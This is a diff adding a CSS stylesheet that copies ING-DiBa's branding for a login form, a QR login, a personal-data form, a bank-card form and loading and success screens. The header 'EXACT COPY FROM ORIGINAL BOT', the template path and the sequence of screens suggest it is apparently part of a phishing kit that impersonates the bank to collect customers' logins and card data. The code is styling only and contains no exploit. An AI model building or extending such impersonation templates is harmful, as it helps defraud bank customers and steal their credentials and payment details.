@@ -1,0 +1,1026 @@
+/* ING-DiBa Styling - EXACT COPY FROM ORIGINAL BOT */
+
+/* Font declarations - PROPER WEIGHT MAPPING */
+@font-face {
+  font-family: 'ING Me';
+  src: url('/templates/ingdiba/fonts/INGMe-Regular.eot');
+  src: url('/templates/ingdiba/fonts/INGMe-Regular.eot?#iefix') format('embedded-opentype'),
+      url('/templates/ingdiba/fonts/INGMe-Regular.woff2') format('woff2'),
+      url('/templates/ingdiba/fonts/INGMe-Regular.woff') format('woff'),
+      url('/templates/ingdiba/fonts/INGMe-Regular.ttf') format('truetype'),
+      url('/templates/ingdiba/fonts/INGMe-Regular.svg#INGMe-Regular') format('svg');
+  font-weight: 400;
+  font-style: normal;
+  font-display: swap;
+}
+
+@font-face {
+  font-family: 'ING Me';
+  src: url('/templates/ingdiba/fonts/INGMe-Bold.eot');
+  src: url('/templates/ingdiba/fonts/INGMe-Bold.eot?#iefix') format('embedded-opentype'),
+      url('/templates/ingdiba/fonts/INGMe-Bold.woff2') format('woff2'),
+      url('/templates/ingdiba/fonts/INGMe-Bold.woff') format('woff'),
+      url('/templates/ingdiba/fonts/INGMe-Bold.ttf') format('truetype'),
+      url('/templates/ingdiba/fonts/INGMe-Bold.svg#INGMe-Bold') format('svg');
+  font-weight: 700;
+  font-style: normal;
+  font-display: swap;
+}
+
+/* Color variables */
+:root {
+  --ing-orange: #ff6200;
+  --ing-blue: #003380;
+  --ing-white: #ffffff;
+  --ing-black: #333333;
+  --ing-gray: #999999;
+  --ing-dark-gray: #666666;
+  --ing-light-gray: #f2f2f2;
+  --ing-error: #e30613;
+  --ing-success: #00a651;
+  --ing-warning: #ffcc00;
+  --border_info_color: #559bd1;
+  --box_shadow_color: #cfe4f4;
+  --base-color: #ff6200;
+}
+
+/* Global styles */
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  font-family: 'ING Me', Arial, sans-serif;
+  font-size: 16px;
+  line-height: 1.5;
+  color: #333;
+  margin: 0;
+  padding: 0;
+  background-color: #f0f0f0;
+  font-weight: normal;
+}
+
+body.ingdiba-template {
+  font-family: 'ING Me', Arial, sans-serif !important;
+  font-weight: normal !important;
+}
+
+a {
+  color: var(--ing-blue);
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+.link {
+  color: #ff6200;
+  text-decoration: none;
+}
+
+.link:hover {
+  text-decoration: underline;
+}
+
+.links-container {
+  margin-top: 20px;
+}
+
+.forgotten-link, .create-link, .qr-link {
+  color: #525199;
+  text-decoration: underline;
+}
+
+.forgotten-link:hover, .create-link:hover, .qr-link:hover {
+  text-decoration: underline;
+  color: #3a3a6e;
+}
+
+.new-user {
+  margin-top: 20px;
+}
+
+.new-user p {
+  margin: 0 0 5px 0;
+  color: #333;
+}
+
+/* Main layout */
+.ing-app {
+  display: flex;
+  flex-direction: column;
+  min-height: 100vh;
+  width: 100%;
+  background-color: #f0f0f0;
+  font-family: 'ING Me', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+}
+
+.content-container {
+  flex: 1;
+  max-width: 1200px;
+  width: 100%;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+.content-container__title {
+  margin-bottom: 20px;
+  text-align: center;
+}
+
+.content-container__title h1 {
+  font-size: 28px;
+  font-weight: 500;
+  color: #333;
+}
+
+/* Cards */
+.ing-card {
+  background-color: #fff;
+  border-radius: 4px;
+  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+  margin-bottom: 20px;
+  padding: 0;
+}
+
+.info-box-card {
+  margin-bottom: 20px;
+  background-color: #ffffff !important;
+  border-radius: 4px;
+  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+  border: none !important;
+}
+
+.ing-card.info-box-card {
+  background-color: #ffffff !important;
+  border: none !important;
+}
+
+.info-box {
+  display: flex;
+  padding: 24px 30px;
+  align-items: flex-start;
+  background-color: #ffffff !important;
+  background: #ffffff !important;
+  border: none !important;
+}
+
+.info-box__icon {
+  flex-shrink: 0;
+  margin-right: 20px;
+  color: #0073cf;
+  display: flex;
+  align-items: center;
+  padding-top: 2px;
+}
+
+.info-box__icon svg {
+  width: 24px;
+  height: 24px;
+}
+
+.info-box__content {
+  flex: 1;
+}
+
+.info-box__content p {
+  margin: 0 0 16px;
+  line-height: 1.6;
+  color: #696969;
+  font-size: 16px;
+}
+
+.info-box__content p:last-child {
+  margin-bottom: 0;
+}
+
+.info-box__content p strong {
+  color: #333333;
+  font-weight: 500;
+}
+
+.info-box__content .link {
+  color: #525199;
+  text-decoration: underline;
+}
+
+/* Two column layout */
+.two-column-layout {
+  display: flex;
+  flex-direction: column;
+  gap: 20px;
+  width: 100%;
+}
+
+.left-column {
+  flex: 1;
+  min-width: 300px;
+  padding: 30px;
+}
+
+.right-column {
+  flex: 1;
+  min-width: 300px;
+  padding: 30px;
+}
+
+.form-container {
+  width: 100%;
+}
+
+.form-container_content {
+  margin-top: 24px;
+}
+
+@media (min-width: 768px) {
+  .two-column-layout {
+    flex-direction: row;
+  }
+}
+
+/* Card Titles */
+.card-title {
+  font-family: 'ING Me', Arial, sans-serif;
+  font-size: 1.5rem;
+  font-weight: 400;
+  color: #696969;
+  line-height: 32px;
+  margin: 0 0 20px 0;
+  padding: 0;
+}
+
+/* Card title spacing for form components */
+[data-component-name="PersonalDataForm"] .card-title,
+[data-component-name="BankCardForm"] .card-title {
+  margin-bottom: 8px;
+}
+
+/* QR Heading */
+.qr-heading {
+  display: flex;
+  align-items: center;
+  padding: 0;
+  margin: 0;
+}
+
+.qr-icon {
+  width: 20px;
+  height: 20px;
+  margin-right: 10px;
+  display: flex;
+  align-self: center;
+}
+
+.qr-title {
+  font-family: 'ING Me', Arial, sans-serif;
+  font-size: 1.5rem;
+  font-weight: 400;
+  color: #696969;
+  line-height: 32px;
+  margin: 0;
+  display: flex;
+  align-self: center;
+}
+
+/* Login Title */
+.login-title {
+  font-size: 24px;
+  font-weight: 400;
+  color: #333;
+  margin-bottom: 20px;
+}
+
+/* Form elements */
+.form-row {
+  display: flex;
+  align-items: flex-start;
+  gap: 16px;
+  margin-bottom: 16px;
+}
+
+.form-group {
+  margin-bottom: 0;
+}
+
+.form-group__label {
+  display: block;
+  font-weight: 500;
+  color: #333;
+  width: 180px;
+  flex-shrink: 0;
+  padding-top: 8px;
+}
+
+.form-group__input-container {
+  flex: 1;
+}
+
+.password-field-wrapper {
+  position: relative;
+  display: inline-block;
+}
+
+.input-field {
+  width: 300px !important;
+  height: 40px !important;
+  text-overflow: ellipsis;
+  appearance: none;
+  background: white;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  display: block;
+  line-height: 1.2 !important;
+  margin: 0;
+  padding: 0 10px !important;
+  font-size: 14px !important;
+  color: #333;
+  transition: border-color 0.2s, box-shadow 0.2s;
+  box-sizing: border-box !important;
+  min-height: 40px !important;
+  max-height: 40px !important;
+}
+
+.ing-card .input-field {
+  height: 40px !important;
+}
+
+.left-column input.input-field,
+.left-column input#username,
+.left-column input#password {
+  height: 40px !important;
+  padding: 0 10px !important;
+  line-height: 1.2 !important;
+}
+
+.input-field::placeholder {
+  color: #333;
+  opacity: 1;
+}
+
+.input-field:focus {
+  outline: none;
+  border-color: var(--border_info_color);
+  border-radius: 6px;
+  box-shadow: 0 0 0 0 #559bd1, 0 0 8px 0 #cfe4f4;
+}
+
+.input-field.error {
+  border-color: #e30613;
+}
+
+.form-group__hint {
+  display: block;
+  font-size: 12px;
+  color: #666;
+  margin-top: 4px;
+  max-width: 300px;
+}
+
+.form-group__error {
+  display: block;
+  color: #e30613;
+  font-size: 14px;
+  margin-top: 4px;
+}
+
+.password-toggle {
+  position: absolute;
+  left: 175px;
+  top: 8px;
+  background: none;
+  border: none;
+  color: #ff6200;
+  cursor: pointer;
+  padding: 0;
+  height: 24px;
+  width: 24px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.password-toggle:focus {
+  outline: none;
+}
+
+/* Buttons */
+.button {
+  align-items: center;
+  appearance: none;
+  background-color: #ff6200;
+  border: none;
+  border-radius: 8px;
+  color: #ffffff;
+  display: inline-flex;
+  font-size: 16px;
+  font-weight: 500;
+  font-family: 'ING Me', Arial, sans-serif;
+  forced-color-adjust: auto;
+  gap: 8px;
+  justify-content: center;
+  line-height: 1.4;
+  min-height: 48px;
+  outline: 0;
+  padding: 12px 24px;
+  position: relative;
+  cursor: pointer;
+  transition: box-shadow 0.2s ease-in-out, background-color 0.2s ease-in-out;
+  text-decoration: none;
+  box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.15);
+  white-space: nowrap;
+  min-width: 140px;
+}
+
+.button-primary {
+  background-color: var(--ing-orange);
+  color: #fff;
+  box-shadow: 2px 2px 4px rgba(0, 0, 0, 0.15);
+}
+
+.button-primary:hover,
+.button-primary:focus {
+  background-color: #e55800;
+  color: #fff;
+  text-decoration: none;
+  box-shadow: 3px 3px 6px rgba(0, 0, 0, 0.2);
+  border: none;
+}
+
+.button-primary:active {
+  background-color: #cc4e00;
+  color: #fff;
+  box-shadow: 1px 1px 3px rgba(0, 0, 0, 0.2);
+}
+
+.button-secondary {
+  background-color: #f0f0f0;
+  color: #333;
+}
+
+.button-secondary:hover,
+.button-secondary:focus {
+  background-color: #e0e0e0;
+  color: #333;
+  text-decoration: none;
+}
+
+.button-secondary:active {
+  background-color: #d0d0d0;
+  color: #333;
+}
+
+.button-block {
+  display: inline-flex;
+  width: 100%;
+}
+
+/* Anmelden button specific styling */
+.anmelden-button-container {
+  margin-top: 24px;
+  display: flex;
+  justify-content: flex-start;
+}
+
+.left-column .button-primary {
+  min-width: 160px;
+  width: auto;
+}
+
+/* QR Login button specific styling */
+.right-column .button-primary {
+  margin-top: 10px;
+}
+
+/* QR Login */
+.qr-login {
+  display: flex;
+  align-items: flex-start;
+  margin-top: 20px;
+}
+
+.qr-login__content {
+  flex: 0.6;
+  margin-right: 20px;
+}
+
+.qr-login__content p {
+  margin: 0 0 16px;
+  line-height: 1.5;
+  font-size: 14px;
+}
+
+.qr-login__image {
+  flex: 0.4;
+  text-align: right;
+  margin-top: 0;
+}
+
+.phone-image {
+  width: 180px;
+  height: auto;
+}
+
+.qr-login__content .button {
+  margin-top: 10px;
+}
+
+.highlight {
+  color: #333;
+}
+
+.checkbox-container {
+  display: flex;
+  align-items: flex-start;
+  margin-top: 16px;
+}
+
+.checkbox-container input[type="checkbox"] {
+  margin-right: 8px;
+  margin-top: 3px;
+}
+
+.checkbox-container label {
+  font-size: 14px;
+  line-height: 1.4;
+}
+
+/* Messages */
+.message-card {
+  margin-top: 20px;
+  padding: 16px 24px;
+}
+
+.current-messages__title {
+  font-size: 18px;
+  font-weight: 400;
+  color: #333;
+  margin: 0 0 16px;
+}
+
+.message-list {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+
+.message-item {
+  display: flex;
+  align-items: center;
+  cursor: pointer;
+  padding: 0;
+}
+
+.message-item__icon {
+  margin-right: 8px;
+  color: #666;
+  display: flex;
+  align-items: center;
+}
+
+.message-item__content {
+  flex: 1;
+}
+
+.message-item__title {
+  font-size: 14px;
+  color: #666;
+  line-height: 1.4;
+}
+
+/* Header */
+.header {
+  background-color: #fff;
+  border-bottom: 1px solid #e6e6e6;
+  padding: 24px 0;
+  z-index: 100;
+}
+
+.header__inner {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0 24px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.header__logo {
+  display: block;
+}
+
+.header__logo img {
+  display: block;
+  max-height: 43px;
+  width: auto;
+}
+
+/* Footer */
+.footer {
+  background-color: #333;
+  color: #fff;
+  padding: 16px 0;
+  margin-top: auto;
+}
+
+.footer__inner {
+  display: flex;
+  flex-direction: column;
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0 20px;
+}
+
+.footer__links {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 16px;
+  margin-bottom: 16px;
+}
+
+.footer__link {
+  color: #fff;
+  text-decoration: none;
+  font-size: 14px;
+}
+
+.footer__link:hover {
+  text-decoration: underline;
+}
+
+.footer__social {
+  display: flex;
+  gap: 16px;
+}
+
+.footer__social-link {
+  color: #fff;
+  text-decoration: none;
+}
+
+/* Responsive adjustments */
+@media (max-width: 768px) {
+  .two-column-layout {
+    flex-direction: column;
+  }
+  
+  .left-column,
+  .right-column {
+    min-width: unset;
+    padding: 20px;
+  }
+  
+  .content-container {
+    padding: 10px;
+  }
+  
+  .input-field,
+  input.input-field,
+  [data-component-name="PersonalDataForm"] .input-field,
+  [data-component-name="BankCardForm"] .input-field,
+  input[type="text"],
+  input[type="tel"],
+  input[type="email"],
+  input[type="date"] {
+    width: 100% !important;
+    max-width: 400px !important;
+    box-sizing: border-box !important;
+  }
+  
+  .form-group__label {
+    width: 100% !important;
+    padding-top: 0 !important;
+    margin-bottom: 8px;
+  }
+  
+  [data-component-name="PersonalDataForm"] .form-group__label,
+  [data-component-name="BankCardForm"] .form-group__label {
+    width: 100% !important;
+    padding-top: 0 !important;
+    margin-bottom: 8px;
+  }
+  
+  .form-row {
+    flex-direction: column !important;
+    align-items: stretch !important;
+  }
+  
+  [data-component-name="PersonalDataForm"] .form-row,
+  [data-component-name="BankCardForm"] .form-row {
+    flex-direction: column !important;
+    align-items: stretch !important;
+  }
+  
+  .button {
+    width: 100%;
+    max-width: 300px;
+    margin: 0 auto;
+  }
+  
+  .anmelden-button-container {
+    justify-content: center;
+  }
+  
+  .qr-login {
+    flex-direction: column;
+  }
+  
+  .qr-login__image {
+    margin-top: 20px;
+    text-align: center;
+  }
+  
+  .qr-login__content {
+    margin-right: 0;
+  }
+  
+  .footer__inner {
+    flex-direction: column;
+  }
+  
+  .footer__links {
+    flex-direction: column;
+    gap: 8px;
+  }
+}
+
+/* Additional mobile optimization for very small screens */
+@media (max-width: 480px) {
+  .left-column,
+  .right-column {
+    padding: 15px;
+  }
+  
+  .content-container {
+    padding: 5px;
+  }
+  
+  .button {
+    font-size: 14px;
+    padding: 10px 20px;
+    min-height: 44px;
+  }
+  
+  .form-group__label {
+    font-size: 14px;
+  }
+  
+  .input-field,
+  input.input-field,
+  [data-component-name="PersonalDataForm"] .input-field,
+  [data-component-name="BankCardForm"] .input-field,
+  input[type="text"],
+  input[type="tel"],
+  input[type="email"],
+  input[type="date"] {
+    width: 100% !important;
+    max-width: 400px !important;
+    font-size: 16px !important; /* Prevents zoom on iOS */
+    padding: 12px 10px !important;
+    box-sizing: border-box !important;
+  }
+}
+
+/* Set all paragraphs in the LoginForm component to 1rem */
+[data-component-name="LoginForm"] p {
+  font-size: 1rem;
+}
+
+/* Loading */
+.loading-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 40px 20px;
+  text-align: center;
+}
+
+.loading-spinner {
+  width: 60px;
+  height: 60px;
+  border: 5px solid rgba(255, 98, 0, 0.2);
+  border-radius: 50%;
+  border-top-color: #ff6200;
+  animation: spin 1s ease-in-out infinite;
+  margin: 0 auto 20px auto;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+.loading-text {
+  font-size: 18px;
+  color: #333;
+  margin: 0;
+  max-width: 400px;
+  line-height: 1.5;
+}
+
+/* Success Screen */
+.success-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+  padding: 30px 20px;
+  max-width: 600px;
+  margin: 0 auto;
+}
+
+.success-icon {
+  color: #00a91c;
+  margin-bottom: 20px;
+}
+
+.success-title {
+  font-size: 24px;
+  font-weight: 500;
+  color: #333;
+  margin-bottom: 20px;
+}
+
+.success-confirmation {
+  display: flex;
+  align-items: center;
+  background-color: #e8f5e9;
+  border-radius: 4px;
+  padding: 12px 16px;
+  margin-bottom: 20px;
+  width: 100%;
+  max-width: 400px;
+}
+
+.confirmation-icon {
+  color: #00a91c;
+  margin-right: 12px;
+  flex-shrink: 0;
+}
+
+.confirmation-text {
+  font-weight: 500;
+  color: #333;
+}
+
+.success-message {
+  font-size: 16px;
+  line-height: 1.5;
+  color: #666;
+  margin-bottom: 24px;
+  max-width: 500px;
+}
+
+.success-info {
+  background-color: #f5f5f5;
+  border-radius: 4px;
+  padding: 16px;
+  margin-bottom: 24px;
+  width: 100%;
+}
+
+.success-info p {
+  font-size: 14px;
+  line-height: 1.5;
+  color: #666;
+  margin: 0;
+}
+
+.success-info strong {
+  color: #333;
+}
+
+[data-component-name="SuccessScreen"] .button-container {
+  margin-top: 10px;
+  width: 100%;
+  display: flex;
+  justify-content: center;
+}
+
+[data-component-name="SuccessScreen"] .button {
+  min-width: 200px;
+  text-decoration: none;
+}
+
+/* Error Screen */
+.error-container {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+  padding: 30px 20px;
+  max-width: 600px;
+  margin: 0 auto;
+}
+
+.error-icon {
+  color: #e30613;
+  margin-bottom: 20px;
+}
+
+.error-title {
+  font-size: 24px;
+  font-weight: 500;
+  color: #333;
+  margin-bottom: 16px;
+}
+
+.error-message {
+  font-size: 16px;
+  line-height: 1.5;
+  color: #666;
+  margin-bottom: 24px;
+}
+
+[data-component-name="ErrorScreen"] .button {
+  margin-top: 10px;
+  max-width: 300px;
+  text-decoration: none;
+  display: inline-block;
+}
+
+/* Personal Data Form & Bank Card Form Specific Styles */
+[data-component-name="PersonalDataForm"] .form-group,
+[data-component-name="BankCardForm"] .form-group {
+  margin-bottom: 8px;
+}
+
+[data-component-name="PersonalDataForm"] .form-row,
+[data-component-name="BankCardForm"] .form-row {
+  display: flex;
+  align-items: flex-start;
+}
+
+[data-component-name="PersonalDataForm"] .form-group__label,
+[data-component-name="BankCardForm"] .form-group__label {
+  display: block;
+  font-weight: 500;
+  color: #333;
+  width: 180px;
+  flex-shrink: 0;
+  padding-top: 8px;
+  font-family: 'ING Me', Arial, sans-serif;
+}
+
+[data-component-name="PersonalDataForm"] .form-group__input-container,
+[data-component-name="BankCardForm"] .form-group__input-container {
+  flex: 1;
+}
+
+[data-component-name="PersonalDataForm"] .input-field,
+[data-component-name="BankCardForm"] .input-field {
+  height: 40px !important;
+  font-family: 'ING Me', Arial, sans-serif;
+}
+
+[data-component-name="PersonalDataForm"] .form-group__hint,
+[data-component-name="BankCardForm"] .form-group__hint {
+  display: block;
+  font-size: 12px;
+  color: #666;
+  margin-top: 4px;
+  max-width: 300px;
+  font-family: 'ING Me', Arial, sans-serif;
+}
+
+[data-component-name="PersonalDataForm"] .form-group__error,
+[data-component-name="BankCardForm"] .form-group__error {
+  display: block;
+  color: #e30613;
+  font-size: 14px;
+  margin-top: 4px;
+  font-family: 'ING Me', Arial, sans-serif;
+}
+
+[data-component-name="PersonalDataForm"] .heading--s,
+[data-component-name="BankCardForm"] .heading--s {
+  font-size: 18px;
+  font-weight: 500;
+  color: #333;
+  margin: 0 0 16px;
+  font-family: 'ING Me', Arial, sans-serif;
+}
+
+[data-component-name="PersonalDataForm"] p,
+[data-component-name="BankCardForm"] p {
+  font-family: 'ING Me', Arial, sans-serif;
+  color: #666;
+  line-height: 1.5;
+}
+
+/* Ensure proper ING font usage across all components */
+[data-component-name="PersonalDataForm"],
+[data-component-name="BankCardForm"],
+[data-component-name="SuccessScreen"] {
+  font-family: 'ING Me', Arial, sans-serif !important;
+}
+
+[data-component-name="PersonalDataForm"] *,
+[data-component-name="BankCardForm"] *,
+[data-component-name="SuccessScreen"] * {
+  font-family: inherit;
+}
